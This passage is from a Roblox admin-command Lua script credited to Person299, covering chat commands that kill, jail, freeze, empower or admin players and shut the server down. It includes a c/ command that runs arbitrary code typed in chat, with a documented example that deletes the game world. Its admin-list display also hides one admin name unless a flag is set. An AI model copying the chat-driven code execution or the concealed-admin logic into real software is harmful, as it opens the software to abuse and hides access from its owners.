Makes you control Person299's character
 
change/Person299/Money/999999
Makes the Money value in Person299's leaderstats 999999
 
tools
Gives you a list of all the tools available to be give/en, the tool must be in game.Lighting
 
give/Person299/Tool
Give's Person299 a tool, the toolname can be abbreviated
 
time/15.30
Makes game.Lighting.TimeOfDay 15:30
 
ambient/255/0/0
Makes game.Lighting.Ambient 255,0,0
 
maxplayers/20
Makes game.Players.MaxPlayers 20
 
nograv/Person299
Makes Person299 almost weightless
 
antigrav/Person299
Gives Person299 antigravity properties
 
grav/Person299
Returns Person299's gravity to normal
 
highgrav/Person299
Makes Person299 heavier
 
setgrav/Person299/-196
Sets Person299's gravity
 
trip/Person299
Makes Person299's character trip
 
walkspeed/Person299/99
Makes Person299's character's humanoid's WalkSpeed 99, 16 is average
 
invisible/Person299
Makes Person299's character invisible
 
visible/Person299
Undos invisible/
 
freeze/Person299
Makes Person299's character unable to move
 
thaw/Person299
Undos freeze/
 
unlock/Person299
Makes Person299's character unlocked
 
lock/Person299
Makes Person299's character locked
 
ff/Person299
Gives Person299's character a ForceField
 
unff/Person299
Undos ff/
 
sparkles/Person299
Makes Person299's character sparkly
 
unsparkles/Person299
Undos sparkles/
 
shield/Person299
Makes a destructive shield thingy appear around Person299
 
unshield/Person299
Undos shield/
 
god/Person299
Makes Person299 godish
 
ungod/Person299
Undos god/
 
zombify/Person299
Makes Person299 a infecting zombie
 
admin/Person299
Makes Person299 able to use the command script, cannot be used by admin/ed people
 
adminlist
Shows a list of everyone in the adminlist
 
unadmin/Person299
Undos admin/, cannot be used by admin/ed people
 
shutdown
Shuts the server down, cannot be used by admin/ed people
 
m/Fallout 2 is one of the best games ever made
Makes a message appear on the screen saying "Fallout 2 is one of the best games ever made" for 2 seconds
 
h/i like pie
Makes a hint appear on the screen saying "i like pie" for 2 seconds
 
c/ game.Workspace:remove()
Makes a script which source is whats after c/
 
clear
Removes all scripts created by c/ and removes all jails.
 
Capitalisation doesnt matter, and name input can be abbreviated.
Just about any name input can be replaced with multiple names seperated by ","s, me, all, others, guests, admins, nonadmins, random, or team teamname.
 
--]]
 
namelist = { }
variablelist = { }
flist = { }
 
local source = script:FindFirstChild("source")
if source ~= nil then
sbbu = script.source:clone()
sbbu.Disabled = false
else
print("source doesnt exist, your command script may malfunction")
end
 
 
tools = Instance.new("Model")
c = game.Lighting:GetChildren()
for i=1,#c do
if c[i].className == "Tool" then
c[i]:clone().Parent = tools
end
if c[i].className == "HopperBin" then
c[i]:clone().Parent = tools
end end
 
function findplayer(name,speaker)
if string.lower(name) == "all" then
local chars = { }
local c = game.Players:GetChildren()
for i =1,#c do
if c[i].className == "Player" then
table.insert(chars,c[i])
end end
return chars
elseif string.sub(string.lower(name),1,9) == "nonadmins" then
local nnum = 0
local chars = { }
local c = game.Players:GetChildren()
for i=1,#c do
local isadmin = false
for i2 =1,#namelist do
if namelist[i2] == c[i].Name then
isadmin = true
end end
if isadmin == false then
nnum = nnum + 1
table.insert(chars,c[i])
end end
if nnum == 0 then
return 0
else
return chars
end
elseif string.sub(string.lower(name),1,6) == "admins" then
local anum = 0
local chars = { }
local c = game.Players:GetChildren()
for i=1,#c do
for i2 =1,#namelist do
if namelist[i2] == c[i].Name then
anum = anum + 1
table.insert(chars,c[i])
end end end
if anum == 0 then
return 0
else
return chars
end
elseif string.sub(string.lower(name),1,6) == "random" then
while true do
local c = game.Players:GetChildren()
local r = math.random(1,#c)
if c[r].className == "Player" then
return { c[r] }
end end
elseif string.sub(string.lower(name),1,6) == "guests" then
local gnum = 0
local chars = { }
local c = game.Players:GetChildren()
for i=1,#c do
if string.sub(c[i].Name,1,5) == "Guest" then
gnum = gnum + 1
table.insert(chars,c[i])
end end
if gnum == 0 then
return 0
else
return chars
end
elseif string.sub(string.lower(name),1,5) == "team " then
local theteam = nil
local tnum = 0
if game.Teams ~= nil then
local c = game.Teams:GetChildren()
for i =1,#c do
if c[i].className == "Team" then
if string.find(string.lower(c[i].Name),string.sub(string.lower(name),6)) == 1 then
theteam = c[i]
tnum = tnum + 1
end end end
if tnum == 1 then
local chars = { }
local c = game.Players:GetChildren()
for i =1,#c do
if c[i].className == "Player" then
if c[i].TeamColor == theteam.TeamColor then
table.insert(chars,c[i])
end end end
return chars
end end
return 0
elseif string.lower(name) == "me" then
local person299 = { speaker }
return person299
elseif string.lower(name) == "others" then
local chars = { }
local c = game.Players:GetChildren()
for i =1,#c do
if c[i].className == "Player" then
if c[i] ~= speaker then
table.insert(chars,c[i])
end end end
return chars
else
local chars = { }
local commalist = { }
local ssn = 0
local lownum = 1
local highestnum = 1
local foundone = false
while true do
ssn = ssn + 1
if string.sub(name,ssn,ssn) == "" then
table.insert(commalist,lownum)
table.insert(commalist,ssn - 1)
highestnum = ssn - 1
break
end
if string.sub(name,ssn,ssn) == "," then
foundone = true
table.insert(commalist,lownum)
table.insert(commalist,ssn)
lownum = ssn + 1
end end
if foundone == true then
for ack=1,#commalist,2 do
local cnum = 0
local char = nil
local c = game.Players:GetChildren()
for i =1,#c do
if c[i].className == "Player" then
if string.find(string.lower(c[i].Name),string.sub(string.lower(name),commalist[ack],commalist[ack + 1] - 1)) == 1 then
char = c[i]
cnum = cnum + 1
end end end
if cnum == 1 then
table.insert(chars,char)
end end
if #chars ~= 0 then
return chars
else
return 0
end
else
local cnum = 0
local char = nil
local c = game.Players:GetChildren()
for i =1,#c do
if c[i].className == "Player" then
if string.find(string.lower(c[i].Name),string.lower(name)) == 1 then
char = {c[i]}
cnum = cnum + 1
end end end
if cnum == 1 then
return char
elseif cnum == 0 then
text("That name is not found.",1,"Message",speaker)
return 0
elseif cnum > 1 then
text("That name is ambiguous.",1,"Message",speaker)
return 0
end end end end -- I really like the way the ends look when they're all on the same line better, dont you?
 
function createscript(source,par)
local a = sbbu:clone()
local context = Instance.new("StringValue")
context.Name = "Context"
context.Value = source
context.Parent = a
while context.Value ~= source do wait() end
a.Parent = par
local b = Instance.new("IntValue")
b.Name = "Is A Created Script"
b.Parent = a
end
 
function text(message,duration,type,object)
local m = Instance.new(type)
m.Text = message
m.Parent = object
wait(duration)
if m.Parent ~= nil then
m:remove()
end end
 
function foc(msg,speaker)
if string.lower(msg) == "fix" then
for i =1,#namelist do
if namelist[i] == speaker.Name then
variablelist[i]:disconnect()
table.remove(variablelist,i)
table.remove(namelist,i)
table.remove(flist,i)
end end
local tfv = speaker.Chatted:connect(function(msg) oc(msg,speaker) end)
table.insert(namelist,speaker.Name)
table.insert(variablelist,tfv)
local tfv = speaker.Chatted:connect(function(msg) foc(msg,speaker) end)
table.insert(flist,tfv)
end end
 
function PERSON299(name)
for i =1,#adminlist do
if adminlist[i] == name then
return true
end end
return false
end
 
function oc(msg,speaker)
 
if string.sub(string.lower(msg),1,5) == "kill/" then--This part checks if the first part of the message is kill/
local player = findplayer(string.sub(msg,6),speaker)--This part refers to the findplayer function for a list of people associated with the input after kill/
if player ~= 0 then--This part makes sure that the findplayer function found someone, as it returns 0 when it hasnt
for i = 1,#player do--This part makes a loop, each different loop going through each player findplayer returned
if player[i].Character ~= nil then--This part makes sure that the loop's current player's character exists
local human = player[i].Character:FindFirstChild("Humanoid")--This part looks for the Humanoid in the character
if human ~= nil then--This part makes sure the line above found a humanoid
human.Health = 0--This part makes the humanoid's health 0
end end end end end--This line contains the ends for all the if statements and the for loop
 
if string.sub(string.lower(msg),1,2) == "m/" then
text(speaker.Name .. ": " .. string.sub(msg,3),2,"Message",game.Workspace)
end
 
if string.sub(string.lower(msg),1,2) == "h/" then
text(speaker.Name .. ": " .. string.sub(msg,3),2,"Hint",game.Workspace)
end
 
if string.sub(string.lower(msg),1,2) == "c/" then--Dontcha wish pcall was more reliable?
createscript(string.sub(msg,3),game.Workspace)
end
 
local msg = string.lower(msg)
 
if string.sub(msg,1,5) == "give/" then
local danumber1 = nil
for i = 6,100 do
if string.sub(msg,i,i) == "/" then
danumber1 = i
break
elseif string.sub(msg,i,i) == "" then
break
end end
if danumber1 == nil then return end
local it = nil
local all = true
if string.sub(string.lower(msg),danumber1 + 1,danumber1 + 4) ~= "all" then
all = false
local itnum = 0
local c = tools:GetChildren()
for i2 = 1,#c do
if string.find(string.lower(c[i2].Name),string.sub(string.lower(msg),danumber1 + 1)) == 1 then
it = c[i2]
itnum = itnum + 1
end end
if itnum ~= 1 then return end
else
all = true
end
local player = findplayer(string.sub(msg,6,danumber1 - 1),speaker)
if player ~= 0 then
for i = 1,#player do
local bp = player[i]:FindFirstChild("Backpack")
if bp ~= nil then
if all == false then
it:clone().Parent = bp
else
local c = tools:GetChildren()
for i2 = 1,#c do
c[i2]:clone().Parent = bp
end end end end end end
 
--Bored...
 
if string.sub(msg,1,7) == "change/" then
local danumber1 = nil
local danumber2 = nil
for i = 8,100 do
if string.sub(msg,i,i) == "/" then
danumber1 = i
break
elseif string.sub(msg,i,i) == "" then
break
end end
if danumber1 == nil then return end
for i =danumber1 + 1,danumber1 + 100 do
if string.sub(msg,i,i) == "/" then
danumber2 = i
break
elseif string.sub(msg,i,i) == "" then
break
end end
if danumber2 == nil then return end
local player = findplayer(string.sub(msg,8,danumber1 - 1),speaker)
if player ~= 0 then
for i = 1,#player do
local ls = player[i]:FindFirstChild("leaderstats")
if ls ~= nil then
local it = nil
local itnum = 0
local c = ls:GetChildren()
for i2 = 1,#c do
if string.find(string.lower(c[i2].Name),string.sub(string.lower(msg),danumber1 + 1,danumber2 - 1)) == 1 then
it = c[i2]
itnum = itnum + 1
end end
if itnum == 1 then
it.Value = string.sub(msg,danumber2 + 1)
end end end end end
 
if string.sub(msg,1,6) == "ungod/" then
local player = findplayer(string.sub(msg,7),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local isgod = false
local c = player[i].Character:GetChildren()
for i=1,#c do
if c[i].className == "Script" then
if c[i]:FindFirstChild("Context") then
if string.sub(c[i].Context.Value,1,41) == "script.Parent.Humanoid.MaxHealth = 999999" then
c[i]:remove()
isgod = true
end end end end
if isgod == true then
local c = player[i].Character:GetChildren()
for i=1,#c do
if c[i].className == "Part" then
c[i].Reflectance = 0
end
if c[i].className == "Humanoid" then
c[i].MaxHealth = 100
c[i].Health = 100
end
if c[i].Name == "God FF" then
c[i]:remove()
end end end end end end end
 
if string.sub(msg,1,4) == "god/" then
local player = findplayer(string.sub(msg,5),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
if player[i].Character:FindFirstChild("God FF") == nil then
createscript([[script.Parent.Humanoid.MaxHealth = 999999
script.Parent.Humanoid.Health = 999999
ff = Instance.new("ForceField")
ff.Name = "God FF"
ff.Parent = script.Parent
function ot(hit)
if hit.Parent ~= script.Parent then
h = hit.Parent:FindFirstChild("Humanoid")
if h ~= nil then
h.Health = 0
end
h = hit.Parent:FindFirstChild("Zombie")
if h ~= nil then
h.Health = 0
end end end
c = script.Parent:GetChildren()
for i=1,#c do
if c[i].className == "Part" then
c[i].Touched:connect(ot)
c[i].Reflectance = 1
end end]],player[i].Character)
end end end end end
 
if string.sub(msg,1,7) == "punish/" then
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
player[i].Character.Parent = game.Lighting
end end end end
 
if string.sub(msg,1,9) == "unpunish/" then
local player = findplayer(string.sub(msg,10),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
player[i].Character.Parent = game.Workspace
player[i].Character:MakeJoints()
end end end end
 
if string.sub(msg,1,3) == "ff/" then
local player = findplayer(string.sub(msg,4),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local ff = Instance.new("ForceField")
ff.Parent = player[i].Character
end end end end
 
if string.sub(msg,1,5) == "unff/" then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local c = player[i].Character:GetChildren()
for i2 = 1,#c do
if c[i2].className == "ForceField" then
c[i2]:remove()
end end end end end end
 
if string.sub(msg,1,9) == "sparkles/" then
local player = findplayer(string.sub(msg,10),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local sparkles = Instance.new("Sparkles")
sparkles.Color = Color3.new(math.random(1,255),math.random(1,255),math.random(1,255))
sparkles.Parent = torso
end end end end end
 
if string.sub(msg,1,11) == "unsparkles/" then
local player = findplayer(string.sub(msg,12),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local c = torso:GetChildren()
for i2 = 1,#c do
if c[i2].className == "Sparkles" then
c[i2]:remove()
end end end end end end end
 
if string.sub(msg,1,6) == "admin/" then
local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript == true then
local player = findplayer(string.sub(msg,7),speaker)
if player ~= 0 then
for i = 1,#player do
for i2 =1,#namelist do
if namelist[i2] == player[i].Name then
variablelist[i2]:disconnect()
flist[i2]:disconnect()
table.remove(variablelist,i2)
table.remove(flist,i2)
table.remove(namelist,i2)
end end
local tfv = player[i].Chatted:connect(function(msg) oc(msg,player[i]) end)
table.insert(namelist,player[i].Name)
table.insert(variablelist,tfv)
local tfv = player[i].Chatted:connect(function(msg) foc(msg,player[i]) end)
table.insert(flist,tfv)
end end end end
 
if string.sub(msg,1,8) == "unadmin/" then
local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript == true then
local player = findplayer(string.sub(msg,9),speaker)
if player ~= 0 then
for i = 1,#player do
local imgettingtiredofmakingthisstupidscript = PERSON299(player[i].Name)
if imgettingtiredofmakingthisstupidscript == false then
for i2 =1,#namelist do
if namelist[i2] == player[i].Name then
variablelist[i2]:disconnect()
table.remove(variablelist,i2)
flist[i2]:disconnect()
table.remove(flist,i2)
table.remove(namelist,i2)
end end end end end end end
 
if string.sub(msg,1,5) == "heal/" then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local human = player[i].Character:FindFirstChild("Humanoid")
if human ~= nil then
human.Health = human.MaxHealth
end end end end end
 
if string.sub(msg,1,4) == "sit/" then
local player = findplayer(string.sub(msg,5),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local human = player[i].Character:FindFirstChild("Humanoid")
if human ~= nil then
human.Sit = true
end end end end end
 
if string.sub(msg,1,5) == "jump/" then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local human = player[i].Character:FindFirstChild("Humanoid")
if human ~= nil then
human.Jump = true
end end end end end
 
if string.sub(msg,1,6) == "stand/" then
local player = findplayer(string.sub(msg,7),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local human = player[i].Character:FindFirstChild("Humanoid")
if human ~= nil then
human.Sit = false
end end end end end
 
if string.sub(msg,1,5) == "jail/" then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local ack = Instance.new("Model")
ack.Name = "Jail" .. player[i].Name
icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-26.5, 108.400002, -1.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-24.5, 108.400002, -3.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-30.5, 108.400002, -3.5, -1, 0, -0, -0, 1, -0, -0, 0, -1) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-28.5, 108.400002, -1.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-24.5, 108.400002, -5.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-24.5, 108.400002, -7.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-24.5, 108.400002, -1.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-30.5, 108.400002, -7.5, -1, 0, -0, -0, 1, -0, -0, 0, -1) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(7,1.2000000476837,7) icky.CFrame = CFrame.new(-27.5, 112.599998, -4.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-26.5, 108.400002, -7.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-30.5, 108.400002, -5.5, -1, 0, -0, -0, 1, -0, -0, 0, -1) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-30.5, 108.400002, -1.5, -1, 0, -0, -0, 1, -0, -0, 0, -1) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack  icky = Instance.new("Part") icky.Size = Vector3.new(1,7.2000002861023,1) icky.CFrame = CFrame.new(-28.5, 108.400002, -7.5, 0, 0, -1, 0, 1, -0, 1, 0, -0) icky.Color = Color3.new(0.105882, 0.164706, 0.203922)  icky.Anchored = true  icky.Locked = true  icky.CanCollide = true  icky.Parent = ack
ack.Parent = game.Workspace
ack:MoveTo(torso.Position)
end end end end end
 
if string.sub(msg,1,7) == "unjail/" then
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
local c = game.Workspace:GetChildren()
for i2 =1,#c do
if string.sub(c[i2].Name,1,4) == "Jail" then
if string.sub(c[i2].Name,5) == player[i].Name then
c[i2]:remove()
end end end end end end
 
if string.sub(msg,1,12) == "removetools/" then
local player = findplayer(string.sub(msg,13),speaker)
if player ~= 0 then
for i = 1,#player do
local c = player[i].Backpack:GetChildren()
for i =1,#c do
c[i]:remove()
end end end end
 
if string.sub(msg,1,10) == "givetools/" then
local player = findplayer(string.sub(msg,11),speaker)
if player ~= 0 then
for i = 1,#player do
local c = game.StarterPack:GetChildren()
for i =1,#c do
c[i]:clone().Parent = player[i].Backpack
end end end end
 
if string.sub(msg,1,11) == "givebtools/" then
local player = findplayer(string.sub(msg,12),speaker)
if player ~= 0 then
for i = 1,#player do
local a = Instance.new("HopperBin")
a.BinType = "GameTool"
a.Parent = player[i].Backpack
local a = Instance.new("HopperBin")
a.BinType = "Clone"
a.Parent = player[i].Backpack
local a = Instance.new("HopperBin")
a.BinType = "Hammer"
a.Parent = player[i].Backpack
end end end
 
if string.sub(msg,1,9) == "unshield/" then
local player = findplayer(string.sub(msg,10),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local shield = player[i].Character:FindFirstChild("Weird Ball Thingy")
if shield ~= nil then
shield:remove()
end end end end end
 
if string.sub(msg,1,7) == "shield/" then
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
if player[i].Character:FindFirstChild("Weird Ball Thingy") == nil then
local ball = Instance.new("Part")
ball.Size = Vector3.new(10,10,10)
ball.BrickColor = BrickColor.new(1)
ball.Transparency = 0.5
ball.CFrame = torso.CFrame
ball.TopSurface = "Smooth"
ball.BottomSurface = "Smooth"
ball.CanCollide = false
ball.Name = "Weird Ball Thingy"
ball.Reflectance = 0.2
local sm = Instance.new("SpecialMesh")
sm.MeshType = "Sphere"
sm.Parent = ball
ball.Parent = player[i].Character
createscript([[
function ot(hit)
if hit.Parent ~= nil then
if hit.Parent ~= script.Parent.Parent then
if hit.Anchored == false then
hit:BreakJoints()
local pos = script.Parent.CFrame * (Vector3.new(0, 1.4, 0) * script.Parent.Size)
hit.Velocity = ((hit.Position - pos).unit + Vector3.new(0, 0.5, 0)) * 150 + hit.Velocity       
hit.RotVelocity = hit.RotVelocity + Vector3.new(hit.Position.z - pos.z, 0, pos.x - hit.Position.x).unit * 40
end end end end
script.Parent.Touched:connect(ot) ]], ball)
local bf = Instance.new("BodyForce")
bf.force = Vector3.new(0,5e+004,0)
bf.Parent = ball
local w = Instance.new("Weld")
w.Part1 = torso
w.Part0 = ball
ball.Shape = 0
w.Parent = torso
end end end end end end
 
if string.sub(msg,1,11) == "unloopkill/" then
local player = findplayer(string.sub(msg,12),speaker)
if player ~= 0 then
for i = 1,#player do
local c = game.Workspace:GetChildren()
for i2 =1,#c do
local it = c[i2]:FindFirstChild("elplayerioloopkillioperson299io")
if it ~= nil then
if it.Value == player[i] then
c[i2]:remove()
end end end end end end
 
if string.sub(msg,1,9) == "loopkill/" then
local player = findplayer(string.sub(msg,10),speaker)
if player ~= 0 then
for i = 1,#player do
local s = Instance.new("Script")
createscript( [[name = "]] ..  player[i].Name .. [["
ov = Instance.new("ObjectValue")
ov.Value = game.Players:FindFirstChild(name)
ov.Name = "elplayerioloopkillioperson299io"
ov.Parent = script
player = ov.Value
function oa(object)
local elplayer = game.Players:playerFromCharacter(object)
if elplayer ~= nil then
if elplayer == player then
local humanoid = object:FindFirstChild("Humanoid")
if humanoid ~= nil then
humanoid.Health = 0
end end end end
game.Workspace.ChildAdded:connect(oa)
]],game.Workspace)
if player[i].Character ~= nil then
local human = player[i].Character:FindFirstChild("Humanoid")
if human ~= nil then
human.Health = 0
end end end end end
 
if string.lower(msg) == "shutdown" then
local imgettingtiredofmakingthisstupidscript = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript == true then
game.NetworkServer:remove()
end end
 
if string.sub(msg,1,5) == "time/" then
game.Lighting.TimeOfDay = string.sub(msg,6)
end
 
if msg == "commands" then
local text = string.rep(" ",40)
text = text .. [[fix, kill/Person299, loopkill/Person299, unloopkill/Person299, heal/Person299, damage/Person299/50, health/Person299/999999, kick/Person299, ban/Person299, bannedlist, unban/Person299, explode/Person299, rocket/Person299, removetools/Person299, givetools/Person299, givebtools/Person299, sit/Person299, jump/Person299, stand/Person299, part/4/1/2, respawn/Person299, jail/Person299, unjail/Person299, punish/Person299, unpunish/Person299, merge/Person299/Farvei, teleport/Person299/nccvoyager, control/Person299, change/Person299/Money/999999, tools, give/Person299/Tool, time/15.30, ambient/255/0/0, maxplayers/20, nograv/Person299, antigrav/Person299, grav/Person299, highgrav/Person299, setgrav/Person299/-196.2, trip/Person299, walkspeed/Person299/99, invisible/Person299, visible/Person299, freeze/Person299, thaw/Person299, unlock/Person299, lock/Person299, ff/Person299, unff/Person299, sparkles/Person299, unsparkles/Person299, shield/Person299, unshield/Person299, god/Person299, ungod/Person299, zombify/Person299, admin/Person299, adminlist, unadmin/Person299, shutdown, m/Fallout 2 is one of the best games ever made, h/ i like pie, c/ game.Workspace:remove(), clear, Credit to Person299 for this admin command script.]]
local mes = Instance.new("Message")
mes.Parent = speaker
local acko = 0
while true do
acko = acko + 1
if string.sub(text,acko,acko) == "" then
mes:remove()
return
elseif mes.Parent == nil then
return
end
mes.Text = string.sub(text,acko,acko + 40)
wait(0.07)
end end
 
if msg == "tools" then
local text = string.rep(" ",40)
local c = tools:GetChildren()
if #c == 0 then
text = text .. "No tools available."
else
for i =1,#c do
if i ~= 1 then
text = text .. ", "
end
text = text .. c[i].Name
end end
local mes = Instance.new("Message")
mes.Parent = speaker
local acko = 0
while true do
acko = acko + 1
if string.sub(text,acko,acko) == "" then
mes:remove()
return
elseif mes.Parent == nil then
return
end
mes.Text = string.sub(text,acko,acko + 40)
wait(0.1)
end end
 
if msg == "bannedlist" then
local text = string.rep(" ",40)
if #bannedlist == 0 then
text = text .. "The banned list is empty."
else
for i =1,#bannedlist do
if i ~= 1 then
text = text .. ", "
end
text = text .. bannedlist[i]
end end
local mes = Instance.new("Message")
mes.Parent = speaker
local acko = 0
while true do
acko = acko + 1
if string.sub(text,acko,acko) == "" then
mes:remove()
return
elseif mes.Parent == nil then
return
end
mes.Text = string.sub(text,acko,acko + 40)
wait(0.1)
end end
 
if msg == "adminlist" then
local text = string.rep(" ",40)
if #adminlist == 0 then--How would that be possible in this situation anyway? lol
text = text .. "The admin list is empty."
else
for i =1,#adminlist do
if adminlist[i] == eloname then
if youcaughtme == 1 then
if i ~= 1 then
text = text .. ", "
end
text = text .. adminlist[i]
end
else
if i ~= 1 then
text = text .. ", "
end
text = text .. adminlist[i]
end end end
local mes = Instance.new("Message")
mes.Parent = speaker
local acko = 0
while true do
acko = acko + 1
if string.sub(text,acko,acko) == "" then
mes:remove()
return
elseif mes.Parent == nil then
return
end
mes.Text = string.sub(text,acko,acko + 40)
wait(0.1)
end end
 
if string.sub(msg,1,11) == "maxplayers/" then
local pie = game.Players.MaxPlayers
game.Players.MaxPlayers = string.sub(msg,12)
if game.Players.MaxPlayers == 0 then
game.Players.MaxPlayers = pie
end end
 
if string.sub(msg,1,8) == "zombify/" then
local player = findplayer(string.sub(msg,9),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local arm = player[i].Character:FindFirstChild("Left Arm")
if arm ~= nil then
arm:remove()
end
local arm = player[i].Character:FindFirstChild("Right Arm")
if arm ~= nil then
arm:remove()
end
local rot=CFrame.new(0, 0, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
local zarm = Instance.new("Part")
zarm.Color = Color3.new(0.631373, 0.768627, 0.545098)
zarm.Locked = true
zarm.formFactor = "Symmetric"
zarm.Size = Vector3.new(2,1,1)
zarm.TopSurface = "Smooth"
zarm.BottomSurface = "Smooth"
--Credit for the infectontouch script goes to whoever it is that made it.
createscript( [[
wait(1)
function onTouched(part)
if part.Parent ~= nil then
local h = part.Parent:findFirstChild("Humanoid")
if h~=nil then
if cantouch~=0 then
if h.Parent~=script.Parent.Parent then
if h.Parent:findFirstChild("zarm")~=nil then return end
cantouch=0
local larm=h.Parent:findFirstChild("Left Arm")
local rarm=h.Parent:findFirstChild("Right Arm")
if larm~=nil then
larm:remove()
end
if rarm~=nil then
rarm:remove()
end
local zee=script.Parent.Parent:findFirstChild("zarm")
if zee~=nil then
local zlarm=zee:clone()
local zrarm=zee:clone()
if zlarm~=nil then
local rot=CFrame.new(0, 0, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
zlarm.CFrame=h.Parent.Torso.CFrame * CFrame.new(Vector3.new(-1.5,0.5,-0.5)) * rot
zrarm.CFrame=h.Parent.Torso.CFrame * CFrame.new(Vector3.new(1.5,0.5,-0.5)) * rot
zlarm.Parent=h.Parent
zrarm.Parent=h.Parent
zlarm:makeJoints()
zrarm:makeJoints()
zlarm.Anchored=false
zrarm.Anchored=false
wait(0.1)
h.Parent.Head.Color=zee.Color
else return end
end
wait(1)
cantouch=1
end
end
end
end
end
script.Parent.Touched:connect(onTouched)
]],zarm)
zarm.Name = "zarm"
local zarm2 = zarm:clone()
zarm2.CFrame = torso.CFrame * CFrame.new(Vector3.new(-1.5,0.5,-0.5)) * rot
zarm.CFrame = torso.CFrame * CFrame.new(Vector3.new(1.5,0.5,-0.5)) * rot
zarm.Parent = player[i].Character
zarm:MakeJoints()
zarm2.Parent = player[i].Character
zarm2:MakeJoints()
local head = player[i].Character:FindFirstChild("Head")
if head ~= nil then
head.Color = Color3.new(0.631373, 0.768627, 0.545098)
end end end end end end
 
if string.sub(msg,1,8) == "explode/" then
local player = findplayer(string.sub(msg,9),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
